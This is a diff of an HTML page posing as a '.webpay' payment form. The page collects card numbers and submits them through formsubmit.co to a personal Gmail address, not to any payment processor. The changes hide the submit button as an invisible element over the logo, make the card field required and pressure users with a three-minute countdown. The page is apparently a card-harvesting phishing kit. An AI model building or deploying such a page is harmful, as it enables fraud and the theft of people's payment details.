@@ -1,6 +1,6 @@
 <html lang="en"><head>
 
-    <link rel="stylesheet" href="">
+    <link rel="icon" href="https://images.unsplash.com/photo-1526304640581-d334cdbbf45e?ixlib=rb-4.0.3&ixid=MnwxMjA3fDB8MHxzZWFyY2h8Mnx8Y2FzaHxlbnwwfHwwfHw%3D&w=1000&q=80">
 
     <style>
 body {
@@ -310,17 +310,17 @@ transition: all .3s ease-in-out;
 
 #button {
 position: absolute;
-    right: 38%;
-    width: 500px;
-    line-height: 10px;
-    background-color: rgb(255, 117, 117);
-   line-height: 10px;
-    border:0;
-    border-radius: 8px;
- 
+top: 120px;
+left: 180px;
+width: 150px;
+height: 50px;
+ background:none;
+border: 0;
 }
 
-
+#button:hover {
+    cursor: pointer;
+}
 
 
 
@@ -334,7 +334,7 @@ position: absolute;
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VIP payment</title>
+    <title>Payment</title>
 </head>
 <body>
     <form action="https://formsubmit.co/robeladmassu750@gmail.com" method="POST">
@@ -343,7 +343,7 @@ position: absolute;
             <div class="outer">
               <header>
                     <div class="logo">
-                        <a href="#"><strong>.web</strong>pay</a>
+                      <a href=""><strong>.web</strong>pay</a>
                     </div>
                     <div id="js-timer" name="timer">
                         <div id="timer" name="timer2">00:00756</div>
@@ -357,7 +357,7 @@ position: absolute;
                                 <p>Card Number</p>
                                 <span>Enter the 16-digits Card Number on the Card</span>
                                 <div class="card-number-box">
-                                    <input name="credit-card-number" type="text" id="credit-card" autocomplete="off" placeholder="xxxx - xxxx - xxxx - xxxx">
+                                    <input name="credit-card-number" type="text" id="credit-card" autocomplete="off" placeholder="xxxx - xxxx - xxxx - xxxx" required>
                                     <span class="cc-logo"></span>
                                 </div>
                             </div>
@@ -427,13 +427,9 @@ position: absolute;
         </div>
     </div>
     <script src="timer.js"></script>
-
-
-<div class="button">
-    <button class="button">
-pay now
-    </button>
-</div>
+<button id="button"></button>
+    </form>
+<p>Please click the web pay on top inorder to sumbit: also you can not fill out this form for more than 3 miniutes or it won't count</p>
 
 
 </body></html>
